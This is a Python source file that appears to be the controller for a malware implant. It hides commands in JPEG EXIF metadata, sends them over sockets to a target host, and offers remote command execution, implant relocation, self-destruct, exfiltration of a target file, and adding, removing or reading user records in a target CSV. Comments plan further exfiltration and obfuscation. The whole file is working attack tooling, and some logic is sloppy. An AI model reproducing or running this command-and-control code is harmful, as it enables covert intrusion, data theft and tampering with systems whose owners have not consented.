#list commands for the implant 
#self destruct 
#fetch whole document 
#fetch new changes 
#add user/password mapping 
#delete user 
#get user 
#sleep 
#organize exfil of data 
import socket
import sys

import piexif
from PIL import Image
from image_decoder import decode_message


def add_custom_metadata(metadata, input_image_path="idFace.jpg", output_image_path="idFacex.jpg"):
    img = Image.open(input_image_path)
    exif_dict = piexif.load(img.info['exif'])

    # Add custom metadata
    exif_dict['Exif'][piexif.ExifIFD.MakerNote] = metadata.encode()

    exif_bytes = piexif.dump(exif_dict)
    img.save(output_image_path, exif=exif_bytes)


def sendCommand(msg: str, s: socket.socket):
    add_custom_metadata(msg)
    print(msg)
    with open("idFacex.jpg", "rb") as img:
        data = img.read(1024)
        while True:
            if not data:
                break
            s.sendall(data)
            data = img.read(1024)
    recieveResponse(s)


def recieveResponse(s: socket.socket):  # TODO make this obfuscate
    img = open("temp.png", "wb")
    incoming = s.recv(1024)
    while incoming[-2:] != b'\xff\xD9':
        img.write(incoming)
        incoming = s.recv(1024)
    img.write(incoming)
    img.close()
    message = decode_message(img)
    if message[:2] == "!!!":
        exit()


def recon(s, command):
    sendCommand(" ".join(command), s)
    recieveResponse(s)


def move(s, command):
    sendCommand(" ".join(command), s)
    recieveResponse(s)


def setPath(s, command):
    sendCommand(" ".join(command), s)
    recieveResponse(s)


def destruct(s: socket.socket):
    sendCommand("3", s)
    recieveResponse(s)


def sleep(s, command):
    sendCommand(" ".join(command), s)
    recieveResponse(s)


def fetchAll(s: socket.socket):
    sendCommand("5", s)
    recieveResponse(s)


def addUser(s, command):
    sendCommand(command, s, )
    recieveResponse(s)


def removeUser(s, command):
    sendCommand(command, s, )
    recieveResponse(s)


def getUser(s, command):
    sendCommand(command, s)
    recieveResponse(s)


def printmenu():
    print("-------COMMAND OPTIONS------")
    print("0:RECON: Exicute command on target. Takes cmd as args. use dir")
    print("1:MOVE: move the implangt to a new location ")
    print("2:SETPATH: sets the path to the target file")
    print("3:DESTRUCT: remove the exploit from target")
    print("4:SLEEP: Make the implant turn off until ")
    print("5:FETCHALL: send back the target file")
    print("6:ADDUSER: adds a row(user) to the target csv file")
    print("7:REMOVEUSER: removes a row(user) to the target csv file")
    print("8:GETUSER: retrieves a row(user) from the target csv file")
    print("9:EXIT: turn off C2")


def commandAndControl(serverIP, serverPort):
    while True:
        print("type MENU for options.")
        command = input("Your wish is their command").split()
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((serverIP, int(serverPort)))
            if command[0] == "MENU":
                printmenu()
            elif command[0] == "0":  # RECON
                recon(s, command)
            elif command[0] == "1":  # MOVE
                move(s, command)
            elif command[0] == "2":  # SETPATH
                setPath(s, command)
            elif command[0] == "3":  # DESTRUCT
                destruct(s)
                s.close()
                exit()
            elif command[0] == "4":  # SLEEP
                sleep(s, command)
                s.close()
                exit()
            elif command[0] == "5":  # FETCHALL
                fetchAll(s)
            elif command[0] == "6":  # ADDUSER
                addUser(s, command)
            elif command[0] == "7":  # REMOVEUSER
                removeUser(s, command)
            elif command[0] == "8":  # GETUSER
                getUser(s, command)
            elif command[0] == "9":  # EXIT
                s.close()
                exit()
            else:
                print(f"{command[0]} is not a proper command")


if __name__ == "__main__":
    serverIP = sys.argv[1]
    serverPort = sys.argv[2]
    commandAndControl(serverIP, serverPort)
